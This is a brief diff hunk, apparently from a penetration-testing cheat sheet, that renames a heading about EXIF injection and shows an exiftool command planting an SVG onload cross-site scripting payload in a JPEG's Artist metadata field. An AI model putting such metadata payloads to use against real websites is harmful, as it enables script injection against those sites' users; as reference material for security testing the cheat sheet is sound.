@@ -705,7 +705,7 @@ searchsploit -p [EDB-ID]
 
 # Exiftool
 
-## exif injection
+## payload injection into exif
 
 ~~~ bash
 exiftool exif.jpg -artist="<svg/onload=alert(45)>"
